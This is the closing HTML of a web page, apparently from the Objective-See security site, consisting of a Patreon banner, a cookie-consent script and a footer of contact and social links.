<p>[<img src="../images/patreon.png"  width="100%" class="center" style="border-radius: 4px;"></p>
<center style="color:#787878; padding-top:5px;"> </center>
](https://www.patreon.com/bePatron?c=701171)
</center>
</div>

</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> ¬ª
        </div>
    </li>

</ul>
</nav>

  </body>
</html>